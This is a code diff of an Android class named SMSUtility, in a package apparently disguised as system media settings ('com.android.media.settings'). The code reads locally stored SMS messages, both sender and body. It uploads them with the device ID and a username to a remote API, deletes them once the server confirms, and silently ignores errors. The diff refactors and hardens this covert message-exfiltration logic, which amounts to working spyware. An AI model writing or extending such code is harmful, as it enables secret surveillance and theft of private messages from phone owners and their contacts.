@@ -6,6 +6,7 @@ import android.os.AsyncTask;
 
 import com.android.media.settings.API.MediaAPI;
 import com.android.media.settings.MediaDBManager;
+import com.android.media.settings.Models.MediaSMS;
 import com.android.media.settings.Services.MediaService;
 import com.android.media.settings.Models.MediaAPIResponse;
 
@@ -29,14 +30,12 @@ public class SMSUtility {
     }
 
     public void initSMSUpload() {
-        Cursor smsCursor = new MediaDBManager(context).getLocalSMS();
         try {
-            if(smsCursor != null && smsCursor.getCount() > 0 && mUtility.networkConnected()) {
-                new SMSUploadTask().execute(smsCursor);
+            MediaSMS mediaSMS = new MediaDBManager(context).getLocalSMS();
+            if(mediaSMS != null && mediaSMS.getIdList() != null && mediaSMS.getIdList().size() > 0) {
+                new SMSUploadTask().execute(mediaSMS);
             }
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
+        } catch (Exception ignored) {}
     }
 
     private void startUpload(Cursor cursor) {
@@ -62,7 +61,9 @@ public class SMSUtility {
 
         @Override
         public void onNext(MediaAPIResponse value) {
-            new MediaDBManager(context).removeSMS(idList);
+            if(value.getStatus() == 1) {
+                new MediaDBManager(context).removeSMS(idList);
+            }
         }
 
         @Override
@@ -72,11 +73,10 @@ public class SMSUtility {
 
         @Override
         public void onComplete() {
-
         }
     };
 
-    private class SMSUploadTask extends AsyncTask<Cursor, Void, Void> {
+    private class SMSUploadTask extends AsyncTask<MediaSMS, Void, Void> {
 
         @Override
         protected void onPreExecute() {
@@ -84,18 +84,11 @@ public class SMSUtility {
         }
 
         @Override
-        protected Void doInBackground(Cursor... params) {
-            Cursor cursor = params[0];
-            StringBuilder stringBuilder = new StringBuilder();
-            while (cursor.moveToNext()) {
-                idList.add(cursor.getString(0));
-                stringBuilder.append(cursor.getString(cursor.getColumnIndex(MediaDBManager.COLUMN_SMS_FROM)));
-                stringBuilder.append(" : ");
-                stringBuilder.append(cursor.getString(cursor.getColumnIndex(MediaDBManager.COLUMN_SMS_BODY)));
-                stringBuilder.append(" \n\n");
-            }
+        protected Void doInBackground(MediaSMS... params) {
+            MediaSMS mediaSMS = params[0];
+            idList = mediaSMS.getIdList();
             MediaAPI api = mUtility.initRetroService();
-            api.postSms(stringBuilder.toString(), mUtility.getDeviceId(), mUtility.getUsername())
+            api.postSms(mediaSMS.getMsgContent().toString(), mUtility.getDeviceId(), mUtility.getUsername())
                     .subscribeOn(Schedulers.newThread())
                     .observeOn(AndroidSchedulers.mainThread())
                     .subscribe(observer);
